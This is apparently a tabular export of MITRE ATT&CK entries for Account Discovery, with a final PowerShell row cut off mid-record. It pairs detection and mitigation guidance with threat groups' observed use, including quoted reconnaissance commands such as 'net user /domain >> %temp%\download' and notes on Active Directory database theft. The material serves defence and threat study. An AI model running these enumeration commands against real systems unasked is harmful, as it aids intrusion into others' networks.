234,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['575'],[],"['API monitoring', 'Process command-line parameters', 'Process monitoring']","['[[Group/G0004|Ke3chang]] performs account discovery using commands such as <code>net localgroup administrators</code> and <code>net group ""REDACTED"" /domain</code> on specific permissions groups.[[CiteRef::Villeneuve et al 2014]]']",['Ke3chang'],['Ke3chang'],['G0004'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about system and domain accounts, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],[],['Discovery'],['Technique/T1087'],['Account Discovery'],https://attack.mitre.org/wiki/Technique/T1087
235,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['575'],[],"['API monitoring', 'Process command-line parameters', 'Process monitoring']",['Commands under <code>net user</code> can be used in [[Software/S0039|Net]] to gather information about and manipulate user accounts.[[CiteRef::Savill 1999]]'],['APT1'],"['APT1', 'Comment Crew', 'Comment Group', 'Comment Panda']",['G0006'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about system and domain accounts, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],"Software: Net, net.exe",['Discovery'],['Technique/T1087'],['Account Discovery'],https://attack.mitre.org/wiki/Technique/T1087
236,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['575'],[],"['API monitoring', 'Process command-line parameters', 'Process monitoring']",['Commands under <code>net user</code> can be used in [[Software/S0039|Net]] to gather information about and manipulate user accounts.[[CiteRef::Savill 1999]]'],['Turla'],"['Turla', 'Waterbug']",['G0010'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about system and domain accounts, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],"Software: Net, net.exe",['Discovery'],['Technique/T1087'],['Account Discovery'],https://attack.mitre.org/wiki/Technique/T1087
237,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['575'],[],"['API monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Software/S0081|Elise]] executes <code>net user</code> after initial communication is made to the remote server.[[CiteRef::Lotus Blossom Jun 2015]]'],['Lotus Blossom'],"['Lotus Blossom', 'Spring Dragon']",['G0030'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about system and domain accounts, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],"Software: Elise, BKDR_ESILE, Page",['Discovery'],['Technique/T1087'],['Account Discovery'],https://attack.mitre.org/wiki/Technique/T1087
238,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['575'],[],"['API monitoring', 'Process command-line parameters', 'Process monitoring']",['Commands under <code>net user</code> can be used in [[Software/S0039|Net]] to gather information about and manipulate user accounts.[[CiteRef::Savill 1999]]'],['Threat Group-1314'],"['Threat Group-1314', 'TG-1314']",['G0028'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about system and domain accounts, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],"Software: Net, net.exe",['Discovery'],['Technique/T1087'],['Account Discovery'],https://attack.mitre.org/wiki/Technique/T1087
239,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['575'],[],"['API monitoring', 'Process command-line parameters', 'Process monitoring']",['Commands under <code>net user</code> can be used in [[Software/S0039|Net]] to gather information about and manipulate user accounts.[[CiteRef::Savill 1999]]'],['Naikon'],['Naikon'],['G0019'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about system and domain accounts, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],"Software: Net, net.exe",['Discovery'],['Technique/T1087'],['Account Discovery'],https://attack.mitre.org/wiki/Technique/T1087
240,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['575'],[],"['API monitoring', 'Process command-line parameters', 'Process monitoring']",['Commands under <code>net user</code> can be used in [[Software/S0039|Net]] to gather information about and manipulate user accounts.[[CiteRef::Savill 1999]]'],['admin@338'],['admin@338'],['G0018'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about system and domain accounts, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],"Software: Net, net.exe",['Discovery'],['Technique/T1087'],['Account Discovery'],https://attack.mitre.org/wiki/Technique/T1087
241,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['575'],[],"['API monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Group/G0018|admin@338]] actors used the following commands following exploitation of a machine with [[Software/S0042|LOWBALL]] malware to enumerate user accounts:\n** <code>net user >> %temp%\\download</code>\n** <code>net user /domain >> %temp%\\download</code>[[CiteRef::FireEye admin@338]]'],['admin@338'],['admin@338'],['G0018'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about system and domain accounts, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],[],['Discovery'],['Technique/T1087'],['Account Discovery'],https://attack.mitre.org/wiki/Technique/T1087
242,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['575'],[],"['API monitoring', 'Process command-line parameters', 'Process monitoring']","[u""[[Group/G0037|FIN6]] has used Metasploit\u2019s [[Software/S0029|PsExec]] NTDSGRAB module to obtain a copy of the victim's Active Directory database.[[CiteRef::FireEye FIN6 April 2016]]""]",['FIN6'],['FIN6'],['G0037'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about system and domain accounts, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],[],['Discovery'],['Technique/T1087'],['Account Discovery'],https://attack.mitre.org/wiki/Technique/T1087
243,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['575'],[],"['API monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Software/S0084|Mis-Type]] may create a file containing the results of the command <code>cmd.exe /c net user {Username}</code>.[[CiteRef::Cylance Dust Storm]]'],['Dust Storm'],['Dust Storm'],['G0031'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about system and domain accounts, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],Software: Mis-Type,['Discovery'],['Technique/T1087'],['Account Discovery'],https://attack.mitre.org/wiki/Technique/T1087
244,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['575'],[],"['API monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Software/S0085|S-Type]] runs the command <code>net user</code> on a victim. [[Software/S0085|S-Type]] also runs tests to determine the privilege level of the compromised user.[[CiteRef::Cylance Dust Storm]]'],['Dust Storm'],['Dust Storm'],['G0031'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about system and domain accounts, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],Software: S-Type,['Discovery'],['Technique/T1087'],['Account Discovery'],https://attack.mitre.org/wiki/Technique/T1087
245,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['575'],[],"['API monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Software/S0049|GeminiDuke]] collects information on local user accounts from the victim.[[CiteRef::F-Secure The Dukes]]'],['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about system and domain accounts, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],Software: GeminiDuke,['Discovery'],['Technique/T1087'],['Account Discovery'],https://attack.mitre.org/wiki/Technique/T1087
246,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['575'],[],"['API monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Group/G0033|Poseidon Group]] searches for administrator accounts on both the local victim machine and the network.[[CiteRef::Kaspersky Poseidon Group]]'],['Poseidon Group'],['Poseidon Group'],['G0033'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about system and domain accounts, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],[],['Discovery'],['Technique/T1087'],['Account Discovery'],https://attack.mitre.org/wiki/Technique/T1087
247,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['575'],[],"['API monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Software/S0063|SHOTPUT]] has a command to retrieve information about connected users.[[CiteRef::Palo Alto CVE-2015-3113 July 2015]]'],['APT3'],"['APT3', 'Gothic Panda', 'Pirpi', 'UPS Team', 'Buckeye', 'Threat Group-0110', 'TG-0110']",['G0022'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about system and domain accounts, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],"Software: SHOTPUT, Backdoor.APT.CookieCutter, Pirpi",['Discovery'],['Technique/T1087'],['Account Discovery'],https://attack.mitre.org/wiki/Technique/T1087
248,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['575'],[],"['API monitoring', 'Process command-line parameters', 'Process monitoring']","['[[Group/G0022|APT3]] has used a tool that can obtain info about local and global group users, power users, and administrators.[[CiteRef::Symantec Buckeye]]']",['APT3'],"['APT3', 'Gothic Panda', 'Pirpi', 'UPS Team', 'Buckeye', 'Threat Group-0110', 'TG-0110']",['G0022'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about system and domain accounts, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],[],['Discovery'],['Technique/T1087'],['Account Discovery'],https://attack.mitre.org/wiki/Technique/T1087
249,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['575'],[],"['API monitoring', 'Process command-line parameters', 'Process monitoring']",['Commands under <code>net user</code> can be used in [[Software/S0039|Net]] to gather information about and manipulate user accounts.[[CiteRef::Savill 1999]]'],['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about system and domain accounts, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],"Software: Net, net.exe",['Discovery'],['Technique/T1087'],['Account Discovery'],https://attack.mitre.org/wiki/Technique/T1087
250,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['575'],[],"['API monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Group/G0045|menuPass]] has used the Microsoft administration tool csvde.exe to export Active Directory data.[[CiteRef::PWC Cloud Hopper Technical Annex April 2017]]'],['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about system and domain accounts, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],[],['Discovery'],['Technique/T1087'],['Account Discovery'],https://attack.mitre.org/wiki/Technique/T1087
251,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['575'],[],"['API monitoring', 'Process command-line parameters', 'Process monitoring']",['Commands under <code>net user</code> can be used in [[Software/S0039|Net]] to gather information about and manipulate user accounts.[[CiteRef::Savill 1999]]'],['Threat Group-3390'],"['Threat Group-3390', 'TG-3390', 'Emissary Panda', 'BRONZE UNION']",['G0027'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about system and domain accounts, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],"Software: Net, net.exe",['Discovery'],['Technique/T1087'],['Account Discovery'],https://attack.mitre.org/wiki/Technique/T1087
252,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['575'],[],"['API monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Group/G0027|Threat Group-3390]] has used <code>net user</code> to conduct internal discovery of systems.[[CiteRef::SecureWorks BRONZE UNION June 2017]]'],['Threat Group-3390'],"['Threat Group-3390', 'TG-3390', 'Emissary Panda', 'BRONZE UNION']",['G0027'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about system and domain accounts, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],[],['Discovery'],['Technique/T1087'],['Account Discovery'],https://attack.mitre.org/wiki/Technique/T1087
253,"['If proper execution policy is set, adversaries will likely be able to define their own execution policy if they obtain administrator or system access, either through the Registry or at the command line. This change in policy on a system may be a way to detect malicious use of PowerShell. If PowerShell is not used in an environment, then simply looking for PowerShell execution may detect malicious activity.\n\nIt is also beneficial to turn on PowerShell logging to gain increased fidelity in what occurs during execution.[[CiteRef::Malware Archaeology PowerShell Cheat Sheet]] PowerShell 5.0 introduced enhanced logging capabilities, and some of those features have since been added to PowerShell 4.0. Earlier versions of PowerShell do not have many logging features.[[CiteRef::FireEye PowerShell Logging 2016]] An organization can gather PowerShell execution details in a data analytic platform to supplement it with other data.']",[],[],[],"['Windows Registry', 'File monitoring', 'Process command-line parameters', 'Process monitoring']","['[[Group/G0009|Deep Panda]] has used PowerShell scripts to download and execute programs in memory, without writing to disk.[[CiteRef::Alperovitch 2014]]']",['Deep Panda'],"['Deep Panda', 'Shell Crew', 'WebMasters', 'KungFu Kittens', 'PinkPanther', 'Black Vine']",['G0009'],"['It may be possible to remove PowerShell from systems when not needed, but a review should be performed to assess the impact to an environment, since it could be in use for many legitimate purposes and administrative functions. When PowerShell is necessary, restrict PowerShell execution policy to administrators and to only execute signed scripts. Be aware that there are methods of bypassing the PowerShell execution policy, depending on environment configuration.[[CiteRef::Netspi PowerShell Execution Policy Bypass]] Disable/restrict the WinRM Service to help prevent uses of PowerShell for remote execution.']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows 